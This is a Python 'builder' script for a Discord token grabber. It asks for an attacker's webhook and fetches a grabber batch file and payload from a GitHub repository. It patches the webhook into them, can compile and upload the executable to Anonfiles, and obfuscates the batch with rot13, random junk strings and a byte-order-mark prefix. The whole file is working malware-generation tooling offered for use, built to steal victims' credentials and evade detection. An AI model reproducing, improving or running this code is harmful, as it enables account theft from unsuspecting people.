import os, string, random, codecs, time
from random import randint
try:
    from tqdm import tqdm
except:
    os.system("pip install tqdm")
    from tqdm import tqdm
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
    import colorama
else:
    colorama.deinit()
try:
    from pystyle import *
except:
    os.system("pip install pystyle")
    from pystyle import *
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from bs4 import BeautifulSoup as bs
except:
    os.system("pip install bs4")
    from bs4 import BeautifulSoup as bs
try:
    from playsound import playsound
except:
    os.system("pip install playsound")
    from playsound import playsound

try:
    import threading
except:
    os.system("pip install threading")
    import threading

banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather and K.Dot#0001 (use headphones for best experience)\n\n
""")

os.system("title BUILDING with K.Dot")
os.system("cls")

def music():
    option = 1
    if option == 1:
        choice = "music1"
    else:
        choice = "music2"
    music = os.path.join(os.getcwd(), f'utils\{choice}.mp3')
    playsound(music)

code = r"""
@%BsTjYW%e%Yw%c%oMRJ%h%mpwxRV%o%r% %PpxghDWC%o%sJFw%f%zL%f%KPaqjYUml%
s%GsG%e%zLliUkhtBP%t%OCdPdukm% %G%"%M%n%xVYB%=%htgbc%a%AHGSkuOt%"%cWPkUXY% %jHN%&%mSEFVmwhB% %wCwvpN%s%qnRPksp%e%RtNbgN%t%tENlw% %kZ%"%O%o%GUo%=%U%b%PXcIWyx%"%xZXeJJbSOw% %oH%&%Gveeq% %wTar%s%cPujhYVk%e%rgT%t%F% %uxOzwjmWCk%"%PpJqM%p%XCPobSQa%=%sWOrVWkU%c%Yd%"%Yp% %h%&%Y% %VqiRIeY%s%fsCj%e%rrC%t%DnAv% %YDVZfnN%"%vY%q%xftUMWAL%=%nTXw%d%ZizUevOxC%"%XRgi% %CQJUDanjc%&%SFsJIRtX% %XeOwyVvJ%s%bol%e%VDanqAb%t%CcXh% %CX%"%DtUqbcj%r%NRKntk%=%OGORwoB%e%iUaeuklpL%"%NXioiWvXp% %XlFWJNj%&%pa% %yGY%s%vC%e%lxoixrd%t%wPK% %JsFAUsTHL%"%BFFmAPvB%s%Oe%=%jfwcxtJtj%f%t%"%zwtxbxJpl% %yxAlXnFrF%&%DHqTlfc% %vHTHBkru%s%dimWOIEuIe%e%NNE%t%OtsavnA% %MEIMoiJA%"%cb%t%MeNzRb%=%FiBqAB%g%UAmVXKUUGs%"%AgCaOGiqkw% %muIJ%&%EcNswqXH% %tsae%s%CqFNeRrg%e%IeYBwkea%t%ugSIbgDcc% %TyFMH%"%jqY%u%PsZcTHUg%=%lWlVZBZ%h%JxuQAfGrm%"%FTmejsEMr% %gG%&%eVYePY% %nJGK%s%R%e%MQC%t%BX% %BHEtDmX%"%Uf%v%T%=%KZAlCUn%i%QPlj%"%XNACF% %EgWVabVW%&%sYdcNNS% %T%s%gsm%e%qTfauXT%t%XXDEFnk% %QurcdzbQw%"%Ki%w%RpzmJSrkU%=%QVLCvby%j%sNQSQV%"%vLlFepLqso% %DxZAxw%&%kNm% %ejoRex%s%zdIaL%e%DYmnhxWjz%t%japQGsqbiE% %wwxK%"%vMNS%x%w%=%K%k%dm%"%ekenHpqFOT% %AhlAffgu%&%BYB% %MmYqRP%s%TFFTiFL%e%pntr%t%IzsrD% %UUKbZtOgbo%"%VdpWCqD%y%WOh%=%AP%l%aaturbsi%"%GN% %jjrXCFOCd%&%ZXW% %ZZ%s%xSEeoRd%e%dBxGYOEE%t%ktBtjzXQ% %wMb%"%sPTHZ%z%wattG%=%G%m%OrBhx%"%jUhQprmKFO% %Mr%&%ikIvavmFkL% %IhkXpLMQe%s%Mhsoada%e%TjJiRO%t%uziQPk% %ZCvUNaf%"%g%a%sUlnaI%=%PEYZAW%n%FXGarBpWN%"%OQZ% %jbLqZBr%&%woFwCthzRn% %obVE%s%eJCfQgIBY%e%IfrLM%t%j% %OPKBMXifJg%"%dxpCADaJD%b%fiw%=%sYzVwe%o%ELxWd%"%ouTDcAYPVG% %cXtZD%&%QfMFnO% %f%s%WIHq%e%HjP%t%IJOaqFI% %vS%"%ceWEDrmYC%c%HttdmbBs%=%XzCbCo%p%aSMWeAFMG%"%tkbpHLBhW% %iK%&%lsZNqRsYjp% %s%s%JJamBDHJmK%e%XtunKrLa%t%lx% %nKFAM%"%nbTKhRKEtn%d%VG%=%jQwiwe%q%utADhM%"%yemdGfhjG% %fEgrfh%&%cOsZeNS% %Vq%s%kXPfezMJX%e%CEBFXGTdxK%t%xcJ% %hdNNSSH%"%Ej%e%UHleVScE%=%KpJdBos%r%vWooKR%"%PafXzmzIHo% %woJaxplOtN%&%JjVXWvKy% %CDzV%s%NTlxkzgb%e%WQfNBT%t%cwTgijFgRv% %COKsmv%"%pFgmElcI%f%fF%=%WuXuT%s%MXMeQvWBT%"%uYeKLaHJnR% %MW%&%G% %CvPelot%s%L%e%yJRe%t%VITwKGf% %GZZADZnS%"%QTRYolgGjq%g%mTiqwxfq%=%kgzD%t%QwjEVC%"%w% %gbGHzyrdhr%&%ZcGRk% %F%s%UHGdWRI%e%ivzt%t%UTbGkdTI% %AKoPCLe%"%XVGf%h%tQavsGYy%=%fanxofD%u%OpLMV%"%TIUrsO% %dUuk%&%eBQbcEJaL% %aKURflYHII%s%Vmz%e%gVB%t%Jj% %pnDveTKEJ%"%KVUlDWnr%i%uxT%=%ozv%v%nHMwFOrE%"%Y% %YzSbPp%&%wbSUXIcKM% %VB%s%YN%e%FlQuiZ%t%HahgLPptN% %mkNQKf%"%rkY%j%BKKLxiE%=%HexePIwzi%w%qWQ%"%mtEFLAG% %K%&%O% %eUwzjdk%s%TBvFEv%e%lCfpOFY%t%LT% %pxpneVc%"%jFkOKLX%k%hLqa%=%mXAEr%x%ymnWlF%"%SDZIS% %sHMwOpwr%&%VMapcGEM% %rmFpxihl%s%WWupRCSo%e%xGi%t%xNcRBsZ% %abrQ%"%cLck%l%dOrVitl%=%no%y%bMctg%"%QPobMZw% %VivpQ%&%gX% %claK%s%oCW%e%qlZwGAf%t%xuvtq% %BAo%"%NtcRhEj%m%XjnYErLH%=%lfMnMoXSGC%z%utmnv%"%P% %rLAlA%&%wGTrRJ% %FGj%s%IMamLZI%e%JtJ%t%Zm% %palwQvo%"%JP%N%YYjD%1%xl%=%Yk%A%Viutbi%"%ocifPbziy% %xjukWw%&%WleqQCQlpI% %nFXu%s%CMOk%e%fdFdPJasP%t%N% %poSVUSjaWd%"%keo%O%LnYMMOCo%1%tceWZ%=%gj%B%GFXagWOfON%"%EVQPV% %LFZZxmT%&%vpEnit% %agBshjn%s%zCxeSvT%e%dcBIYy%t%dACaxa% %bL%"%XZRZUza%P%zzc%1%axlibOPo%=%ZHlPXe%C%gxKMHhTFdr%"%JPDuljgRwn% %H%&%COGu% %yRCuFpM%s%utyjIXUOz%e%I%t%hyDajz% %BEnvzc%"%WNOJdtzCMd%Q%oLwWxeJGmm%1%YIvDKIqqY%=%uXprP%D%pmuWbXwL%"%yhsGNmg% %rnV%&%UyF% %EnzztjIDwV%s%ykKy%e%otxNarlJgV%t%JbOl% %zk%"%nnEJui%R%lrTraqRKER%1%Crfs%=%OgozrRi%E%wXdgJEiNmV%"%dvZ% %sfxFLaLgG%&%GqZGuaEzyy% %e%s%FNuxIw%e%cOaosyNGxO%t%MFZTLrnh% %uzNBO%"%LsEsS%S%ahIYTtzVpH%1%pyngDfaEH%=%TIPVWp%F%fYdSxE%"%tNUzut% %YyJdzCdMR%&%BLO% %pa%s%jBMMgMQy%e%jiVFUZWodJ%t%wbduc% %XLH%"%GAjfxn%T%UHJjUO%1%gIpskgeA%=%EgwKPli%G%aapXragQv%"%sUQHpK% %zivhMl%&%Z% %EHjYDHEjRC%s%QJkItFwXHn%e%jFZTOgg%t%q% %Us%"%LLxAmQ%U%tlGEogoh%1%TAVd%=%yCsvgN%H%Z%"%RXNTfxZDlX% %Uu%&%QlCGcB% %QGFYjClFV%s%tOIKVi%e%WEmxzJ%t%DfWXXmi% %PkMtcWD%"%omY%V%x%1%rewpPHcDn%=%nwKhdzV%I%MEbRSlz%"%MJL% %SaFUSJLAE%&%VsR% %wgclxn%s%YQUIW%e%EZ%t%Qwd% %MTI%"%GesuHBFtB%W%lG%1%ABUoFXFy%=%h%J%tZiBwxpJp%"%xNBZZ% %rfBrrYLKt%&%xifGAPl% %jgGMnzZc%s%ZSoYZshshb%e%BMRMSVr%t%FD% %SymUE%"%h%X%FsbnkdTf%1%aKTEWQJyb%=%tUUonuC%K%hzIeR%"%SWWbmr% %Fxf%&%RyCuQB% %AVKKNwN%s%wQ%e%gKkfOF%t%tc% %f%"%eJaYGl%Y%nFmdKkGxC%1%LeymJg%=%XvPkNTlpX%L%zTOOEhFyxC%"%wqZvtNPj% %FGUlKrDUAT%&%fwISZ% %Io%s%Hmsrd%e%nTbAvQ%t%LTO% %PPtTRwxq%"%Gxb%Z%cuieDUVk%1%suNWIR%=%pgJu%M%GvaPZfycf%"%odbyzIpIY% %CAB%&%ZwoCdaWTQZ% %uGeDuLNHvV%s%vobWwgZrTk%e%v%t%waJOrGnAf% %RLixdDSKO%"%W%A%kfbaEzJ%1%QjT%=%tiyHsB%N%tYdBI%"%bSacSSPOoH% %ZO%&%E% %jZZn%s%FA%e%C%t%a% %sNpEEy%"%GMkrkrbIQ%B%cdgxkh%1%XkUv%=%KsxFnpnpq%O%bxd%"%GxPIuOqau% %Eo%&%lOrU% %M%s%YAkAoKRqMb%e%uRONNsRBEV%t%mmRvz% %Cen%"%vsRrFbFcb%C%GoAdckzQ%1%ErIvSHiq%=%Q%P%EBQzXMScD%"%gy% %SF%&%jIKXBVw% %TJKonr%s%PMMA%e%eh%t%Av% %lgWfjA%"%A%D%f%1%mUq%=%fdLggFvI%Q%pCO%"%KN% %OmcdwA%&%dkaeKs% %cLxnsom%s%XnH%e%bYsS%t%noLNBgTte% %p%"%lXhhgHIJ%E%eG%1%uXP%=%uGv%R%jjQGqlDW%"%EQZ% %YXGlRr%&%AFFPwNE% %QjTThPR%s%ptBRoCdOEr%e%Xx%t%JHrob% %WMBUhfzhuz%"%AIKIichP%F%bg%1%VzKei%=%pw%S%jVM%"%EC% %HD%&%lh% %zvITTUByC%s%cH%e%VEEwVWBZPW%t%pBxRzFQAn% %kVeMWcb%"%h%G%dadhJSzEg%1%CuZ%=%Yhv%T%trkk%"%tkhYer% %zXQACiiIfT%&%rcLIKYFNDJ% %SzHSMh%s%wjaBhBuh%e%jJsep%t%mAWkiemgs% %JM%"%xZ%H%jLxp%1%qLYEuLV%=%WCTvEGAm%U%MQGzAuuDMD%"%KuGGM% %FiKoykvFjH%&%ijh% %Aas%s%XBeJVr%e%TgxhnUA%t%zjvtUeTL% %FbxxK%"%defZO%I%OMljVPus%1%qwirA%=%hqpU%V%AHoeYtdLx%"%sHcmFr% %OzvauWr%&%UzaJ% %lR%s%WP%e%ejVGxmgI%t%uoyI% %AWtuzhKBg%"%utHwpbn%J%Gn%1%TH%=%Qompld%W%PctfWtRdEq%"%QFG% %iceMp%&%ZKyKRiX% %m%s%jBUzlgYUI%e%AYZbmRMHfC%t%Hn% %gk%"%PyU%K%qcMqCzJ%1%gGDlg%=%kuZwNhgaJ%X%FMUDegc%"%oFyaUHUMRC% %TF%&%mcjRcM% %FEBK%s%XnModL%e%JrY%t%o% %o%"%xB%L%necHVuTobe%1%gfB%=%XNn%Y%bDMrpTay%"%BQZGfq% %kRbswp%&%F% %k%s%AqaPahJ%e%XWdPiblnLJ%t%pEWltZGzQL% %WmfeI%"%kGCLReM%M%BcvXbRJNSO%1%wZ%=%kIFSCmXb%Z%aO%"%vahjqvOJe% %mTSSMuCl%&%dPPA% %e%s%KScIJtMBU%e%KsWApz%t%EaFCHKgXT% %Vatz%"%hZADV%l%FVrja%u%eP%l%icZHugoOP%=%TBDCxYz%:%h%"%OWBYkpe%
"""

__author__ = 'K.Dot'

class builder:
    def __init__(self):
        print(Colorate.Vertical(Colors.yellow_to_red, banner, 2))
        print(Colorate.Color(Colors.red, "", False)) #This just keeps the color as red which I like lowkey
        self.webhook = input("Webhook: ")
        self.file = input("File name: ")
        self.obfuscate = True
        self.build_self = input("Would you like to bulid the exe that the grabber uses yourself? (y/n): ")
        if self.build_self == "y":
            self.anon = input("Would you like to use Anonfiles to host exe? (y/n): ")
        self.build()

    def check_webhook(self):
        try:
            url = self.webhook.startswith("https://discordapp.com/api/webhooks/") or self.webhook.startswith("https://discord.com/api/webhooks/")
            if url == True:
                r = requests.get(self.webhook)
                jsons = r.json()
                try:
                    if jsons["message"] == "Unknown Webhook":
                        return False
                    else:
                        return True
                except:
                    return True
            else:
                return False
        except:
            return False

    def make_pyinstaller_stuff(self):
        if self.build_self == "y":
            os.system('pip install colorama; Pillow; pycryptodome; pystyle; pywin32; requests; tqdm; tinyaes')
            if self.anon == "y":
                os.system("pip install pyinstaller")
                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
                with open("built.py", "w+") as f:
                    f.write(grabbruh.text)
                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
                os.remove("built.spec")
                shutil.rmtree("build")
                shutil.move("dist/built.exe", "grabber.exe")
                os.remove("built.py")
                shutil.rmtree("dist")
                uploaded = requests.post(f'https://anonfiles.com/api/upload', files={'file': open('grabber.exe', 'rb')})
                uploaded = uploaded.json()
                uploaded2 = uploaded['data']['file']['url']['full']
                r = requests.get(uploaded2)
                soup = bs(r.content, "html.parser")
                link = soup.find("a", {"id": "download-url"}).get("href")
                final = f"curl {link}"
                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", final)
                return grabber
            elif self.anon == "n":
                direct_download = input("ENTIRE CURL LINK (not this can be curl YOUR_LINK or even curl -LJO YOUR_LINK THIS IS VERY ADVANCED SO DONT USE UNLESS YOU KNOW): ")
                os.system("pip install pyinstaller")
                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
                with open("built.py", "w+") as f:
                    f.write(grabbruh.text)
                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
                os.remove("built.spec")
                shutil.rmtree("build")
                shutil.move("dist/built.exe", "grabber.exe")
                os.remove("built.py")
                shutil.rmtree("dist")
                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", f"{direct_download}")
                return grabber
            else:
                print("Invalid option dumbass")
                builder()

        elif self.build_self == "n":
            grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "")
            return grabber
        else:
            print(Colorate.Color(Colors.red, "Invalid option", False))
            builder()

    def build(self):
        if self.check_webhook():
            print(Colorate.Color(Colors.green, "Webhook is valid!", True))
            print(Colorate.Color(Colors.red, "", False)) #back to red cuh
        else:
            print("WEBHOOK IS INVALID!")
            builder()
        with open(f'{self.file}.bat', 'w+') as f:
            f.write(self.make_pyinstaller_stuff())
        if self.obfuscate == True:
            self.obfuscate_real()
        else:
            print(Colorate.Color(Colors.green, "Done!", True))

    def obfuscate_real(self):
        try:
            os.remove(f'{self.file}.obfuscated.bat')
            os.remove(f'{self.file}.obfuscated.super.bat')
        except:
            pass
        switch = False
        with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
            ammount = len(original.readlines())
        with open(f'{self.file}.bat', 'r+', encoding='utf-8') as original:
            for lines in tqdm(original, total=int(ammount), desc="Obfuscating", unit=" lines"):
                label = lines.startswith(':')
                if label == True:
                    with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                        f.write(lines) # TEMP FIX FOR NOT FINDING FUNCTIONS BATCH
                else:
                    for char in lines:
                        if switch == False:
                            if '\n' in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("\n")
                            elif "%" in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("%")
                                    switch = True #thx baum for making this work :sob:
                            else:
                                random_num = randint(5, 12)
                                random_string = ''.join(random.choice('⎛⎝⎞⎠⎬⎲⎳█▀▁▕﷽﷽﷽abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ𝘈Ḇ𝖢𝕯ḞԍНǏ𝙅ƘԸⲘ𝙉Ρ𝗤Ɍ𝓢ȚЦ𝒱Ѡ𝓧ƳȤѧᖯć𝗱ễ𝑓𝙜Ⴙ𝞲𝑗𝒌ļṃŉо𝞎𝒒ᵲꜱ𝙩ừ𝗏ŵ𝒙𝒚ź☞☟☠☡☢☣☤☥☦☧☰☱☲☳☴☵☶☷☸♕☻♡☹♆♔♅♖♘♗♙♚♛♜♝♞♟♠♡♢♣♤♥♦♧♨♩♪♫♬♭♮♯♰♱♲♳♴♵♶♶♸♹♻♼♽♾⚀⚁⚂⚃⚄⚅⚆⚇⚈⚉⚊⚋⚌⚍⚎⚏⚐⚑⚒⚔⚕⚖⚗⚘⚙⚚⚛⚜⚝⚞⚟﷽﷽﷽') for kdot in range(random_num))
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    if char in string.ascii_letters:
                                        if char.islower():
                                            coded0 = codecs.encode(char, 'rot_13')
                                            coded = coded0.replace(coded0, f"%{coded0}%")
                                            f.write(f"{coded}%{random_string}%")
                                        else:
                                            coded0 = codecs.encode(char, 'rot_13').upper()
                                            coded = coded0.replace(coded0, f'%{coded0}1%')
                                            f.write(f"{coded}%{random_string}%")
                                    else:
                                        f.write(f"{char}%{random_string}%")
                        else:
                            if "%" in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("%")
                                    switch = False
                            elif '\n' in char:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write("\n")
                            else:
                                with open(f'{self.file}.bat.obfuscated.bat', 'a+', encoding='utf-8') as f:
                                    f.write(char) # spent like 2 hours trying to fix this and found baums again :sob: https://github.com/baum1810/batchobfuscator

            with open(f'{self.file}.bat.obfuscated.bat', 'r+', encoding='utf-8') as f:
                everything = f.read()
            with open(f'{self.file}.bat.obfuscated.bat', 'w+', encoding='utf-8') as f:
                f.write(f"{code}\n{everything}")

            out_hex = []

            out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
            with open(f'{self.file}.bat.obfuscated.bat','rb') as f:
                    penis = f.read()

            out_hex.extend(['{:02X}'.format(b) for b in penis])

            with open(f'{self.file}.bat.obfuscated.super.bat', 'wb') as f:
                for i in out_hex:
                    f.write(bytes.fromhex(i))

            print(Colorate.Color(Colors.green, "Done!", True))


if __name__ == '__main__':
    if __author__ != '\x4b\x2e\x44\x6f\x74':
        print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
        os._exit(0)
    threading.Thread(target = music).start()
    time.sleep(3)
    threading.Thread(target = builder).start()
